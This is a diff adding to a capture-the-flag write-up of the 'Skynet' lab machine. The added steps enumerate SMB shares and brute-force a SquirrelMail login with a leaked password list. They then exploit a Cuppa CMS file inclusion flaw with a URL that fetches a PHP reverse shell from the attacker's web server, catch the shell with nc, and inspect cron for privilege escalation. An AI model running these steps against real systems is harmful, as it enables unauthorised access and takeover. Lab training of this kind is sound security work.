@@ -115,14 +115,16 @@ OS and Service detection performed. Please report any incorrect results at https
         ---------            -------
         WORKGROUP            SKYNET
 
-Aha, there's an anonymous share. Connect:
+One of the shares is called milesdyson, that could be the administrator's name. And, there is an anonymous share. 
+
+Connect to the anonymous share:
 
     # smbclient //10.10.62.253/anonymous
     Password for [WORKGROUP\root]:
     Try "help" to get a list of possible commands.
     smb: \>  
 
-Explore the anonymous share:
+Explore the anonymous share, and `get` what seems of interest for furthering access:
 
     smb: \> dir
       .                                   D        0  Thu Nov 26 16:04:00 2020
@@ -150,6 +152,51 @@ Explore the anonymous share:
     Get file log3.txt? y
     getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.1 KiloBytes/sec)
     smb: \logs\> exit
+
+Content of `attention.txt`:
+
+    # cat attention.txt 
+    A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+    -Miles Dyson
+
+A message that would be sent by a system's administrator, by "Miles Dyson".
+
+Content of logs:
+
+    #  cat log*           
+    cyborg007haloterminator
+    terminator22596
+    terminator219
+    terminator20
+    terminator1989
+    terminator1988
+    terminator168
+    terminator16
+    terminator143
+    terminator13
+    terminator123!@#
+    terminator1056
+    terminator101
+    terminator10
+    terminator02
+    terminator00
+    roboterminator
+    pongterminator
+    manasturcaluterminator
+    exterminator95
+    exterminator200
+    dterminator
+    djxterminator
+    dexterminator
+    determinator
+    cyborg007haloterminator
+    avsterminator
+    alonsoterminator
+    Walterminator
+    79terminator6
+    1996terminator
+
+Seems to be some kind of password list???
 
 Find hidden files or directories using gobuster:
 
@@ -182,6 +229,228 @@ Find hidden files or directories using gobuster:
     2022/10/01 02:33:34 Finished
     ===============================================================
 
-A squirrelmail entry. 
+A SquirrelMail entry. 
 
-### Brute-forcing squirrelmail
+### Brute-forcing SquirrelMail
+
+Using that loglist of possible passwords, try a 
+[brute-forcing attack in Burpsuite](https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types) 
+intruder with a possible username of `milesdyson`:
+
+| ![Intercept](../../_static/images/Screenshot from 2022-10-01 15-47-12.png) |
+|:--:|
+| Intercept a login attempt, send to Intruder |
+
+| ![Set payload](../../_static/images/Screenshot from 2022-10-01 15-55-42.png) |
+|:--:|
+| Set position "admin" and set payload with list found in logs |
+
+| ![Sniper](../../_static/images/Screenshot from 2022-10-01 16-06-09.png) |
+|:--:|
+| Run sniper attack |
+
+Authenticate into SquirrelMail using the password found by Burp Suite intruder.
+
+There are three emails, one of which has a subject of "Samba Password reset", with a rather 
+interesting content:
+
+| ![Email1](../../_static/images/Screenshot from 2022-10-01 16-11-16.png) |
+|:--:|
+| Samba password reset |
+
+### SMB again
+
+Use the password found to log in to the `milesdyson` share found earlier:
+
+    # smbclient -U milesdyson //10.10.56.232/milesdyson  
+    Password for [WORKGROUP\milesdyson]:
+    Try "help" to get a list of possible commands.
+    smb: \> 
+
+Explore:
+
+    smb: \> dir
+      .                                   D        0  Tue Sep 17 10:05:47 2019
+      ..                                  D        0  Wed Sep 18 04:51:03 2019
+      Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019
+      Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
+      Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019
+      notes                               D        0  Tue Sep 17 10:18:40 2019
+      Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019
+      Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019
+    
+            9204224 blocks of size 1024. 5831448 blocks available
+    smb: \> cd notes
+    smb: \notes\> dir
+      .                                   D        0  Tue Sep 17 10:18:40 2019
+      ..                                  D        0  Tue Sep 17 10:05:47 2019
+      3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019
+      4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019
+      2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019
+      0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019
+      1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019
+      important.txt                       N      117  Tue Sep 17 10:18:39 2019
+      6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019
+      3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019
+      2.01 Overview.md                    N     1165  Tue Sep 17 10:01:29 2019
+      3.02 Planning.md                    N    71657  Tue Sep 17 10:01:29 2019
+      1.04 Probability.md                 N    62712  Tue Sep 17 10:01:29 2019
+      2.06 Natural Language Processing.md      N    82633  Tue Sep 17 10:01:29 2019
+      2.00 Machine Learning.md            N       26  Tue Sep 17 10:01:29 2019
+      1.03 Calculus.md                    N    40779  Tue Sep 17 10:01:29 2019
+      3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 10:01:29 2019
+      1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 10:01:29 2019
+      1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 10:01:29 2019
+      6.00 Appendices.md                  N       20  Tue Sep 17 10:01:29 2019
+      1.01 Functions.md                   N     7627  Tue Sep 17 10:01:29 2019
+      2.03 Neural Nets.md                 N   144726  Tue Sep 17 10:01:29 2019
+      2.04 Model Selection.md             N    33383  Tue Sep 17 10:01:29 2019
+      2.02 Supervised Learning.md         N    94287  Tue Sep 17 10:01:29 2019
+      4.00 Simulation.md                  N       20  Tue Sep 17 10:01:29 2019
+      3.05 In Practice.md                 N     1123  Tue Sep 17 10:01:29 2019
+      1.07 Graphs.md                      N     5110  Tue Sep 17 10:01:29 2019
+      2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 10:01:29 2019
+      2.05 Bayesian Learning.md           N    39443  Tue Sep 17 10:01:29 2019
+      5.03 Anonymization.md               N     2516  Tue Sep 17 10:01:29 2019
+      5.01 Process.md                     N     5788  Tue Sep 17 10:01:29 2019
+      1.09 Optimization.md                N    25823  Tue Sep 17 10:01:29 2019
+      1.05 Statistics.md                  N    64291  Tue Sep 17 10:01:29 2019
+      5.02 Visualization.md               N      940  Tue Sep 17 10:01:29 2019
+      5.00 In Practice.md                 N       21  Tue Sep 17 10:01:29 2019
+      4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 10:01:29 2019
+      1.10 Algorithms.md                  N    28790  Tue Sep 17 10:01:29 2019
+      3.04 Filtering.md                   N    13360  Tue Sep 17 10:01:29 2019
+      1.00 Foundations.md                 N       22  Tue Sep 17 10:01:29 2019
+    
+            9204224 blocks of size 1024. 5831448 blocks available
+    smb: \notes\>
+
+Get that `important.txt`:
+
+    smb: \notes\> get important.txt
+    getting file \notes\important.txt of size 117 as important.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+
+And read it on local machine:
+
+```text
+# cat important.txt
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+```
+
+A CMS in beta!
+
+| ![CMS](../../_static/images/Screenshot from 2022-10-01 16-25-26.png) |
+|:--:|
+| http://10.10.56.232/45kra24zxs28v3yd/ |
+
+Find its directories with gobuster:
+
+    # gobuster dir -u http://10.10.56.232/45kra24zxs28v3yd/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50
+    ===============================================================
+    Gobuster v3.1.0
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+    ===============================================================
+    [+] Url:                     http://10.10.56.232/45kra24zxs28v3yd/
+    [+] Method:                  GET
+    [+] Threads:                 50
+    [+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+    [+] Negative Status codes:   404
+    [+] User Agent:              gobuster/3.1.0
+    [+] Extensions:              php,html,txt
+    [+] Timeout:                 10s
+    ===============================================================
+    2022/10/01 16:30:01 Starting gobuster in directory enumeration mode
+    ===============================================================
+    /index.html           (Status: 200) [Size: 418]
+    /administrator        (Status: 301) [Size: 337] [--> http://10.10.56.232/45kra24zxs28v3yd/administrator/]
+                                                                                                             
+    ===============================================================
+    2022/10/01 16:42:24 Finished
+    ===============================================================
+
+| ![administrator page](../../_static/images/Screenshot from 2022-10-01 16-32-18.png) |
+|:--:|
+| http://10.10.56.232/45kra24zxs28v3yd/administrator/ |
+
+    # searchsploit cuppa cms   
+    ---------------------------------------------- ---------------------------------
+     Exploit Title                                |  Path
+    ---------------------------------------------- ---------------------------------
+    Cuppa CMS - '/alertConfigField.php' Local/Rem | php/webapps/25971.txt
+    ---------------------------------------------- ---------------------------------
+    Shellcodes: No Results
+    Papers: No Results
+                                                                                
+    # searchsploit -m php/webapps/25971.txt
+      Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
+          URL: https://www.exploit-db.com/exploits/25971
+         Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
+    File Type: C++ source, ASCII text, with very long lines (876)
+    
+    Copied to: /home/nina/Downloads/skynet/25971.txt
+
+Confirm the [25971 exploit](https://www.exploit-db.com/exploits/25971)
+
+| ![Confirmed](../../_static/images/Screenshot from 2022-10-01 16-52-02.png) |
+|:--:|
+| http://10.10.56.232/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?<br>urlConfig=../../../../../../../../../etc/passwd |
+
+It is vulnerable to Remote File Inclusion. Use a reverse shell.
+
+Start a listener:
+
+    # nc -nlvp 1234
+    Ncat: Version 7.92 ( https://nmap.org/ncat )
+    Ncat: Listening on :::1234
+    Ncat: Listening on 0.0.0.0:1234
+
+[Download a PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell) and edit it to use your local machine IP. 
+ 
+Make it available via a python web server: 
+
+    python3 -m http.server 8000
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+    10.10.56.232 - - [01/Oct/2022 17:59:43] "GET /php-reverse-shell.php HTTP/1.0" 200 -
+    10.10.56.232 - - [01/Oct/2022 18:04:11] "GET /php-reverse-shell.php HTTP/1.0" 200 -
+
+And open `http://10.10.56.232/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.1.53:8000/php-reverse-shell.php` 
+in your browser.
+
+And connection:
+
+    # nc -nlvp 1234
+    Ncat: Version 7.92 ( https://nmap.org/ncat )
+    Ncat: Listening on :::1234
+    Ncat: Listening on 0.0.0.0:1234
+    Ncat: Connection from 10.10.56.232.
+    Ncat: Connection from 10.10.56.232:46822.
+    Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+     12:04:11 up  2:20,  0 users,  load average: 0.00, 0.00, 0.00
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    /bin/sh: 0: can't access tty; job control turned off
+    $
+
+Explore:
+
+    $ cat /etc/crontab
+    # /etc/crontab: system-wide crontab
+    # Unlike any other crontab you don't have to run the `crontab'
+    # command to install the new version when you edit this file
+    # and files in /etc/cron.d. These files also have username fields,
+    # that none of the other crontabs do.
+    
+    SHELL=/bin/sh
+    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+    
+    # m h dom mon dow user	command
+    */1 *	* * *   root	/home/milesdyson/backups/backup.sh
+    17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+    25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+    47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+    52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+    #
+
+See [Cron job exploits](https://tymyrddin.github.io/red-escalation/docs/linux/cron.html)
